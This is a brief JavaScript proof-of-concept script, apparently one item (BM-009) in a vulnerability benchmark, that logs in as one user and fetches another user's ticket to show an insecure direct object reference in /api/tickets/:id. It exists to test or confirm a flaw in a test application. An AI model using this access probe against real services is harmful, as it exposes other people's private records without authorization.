'use strict';

const poc = require('./lib/common');

// BM-009: IDOR in /api/tickets/:id (alice reads bob's ticket).
poc.run(async function () {
  const token = await poc.login('alice');
  const own = await poc.request('GET', '/api/tickets/1', { headers: poc.bearer(token) });
  poc.control(own.status === 200, 'own ticket readable');
  const res = await poc.request('GET', '/api/tickets/2', { headers: poc.bearer(token) });
  poc.finish(res.status === 200 && res.body.includes('secret-TICKET-2'), 'status ' + res.status + ' reading ticket 2 as alice');
});
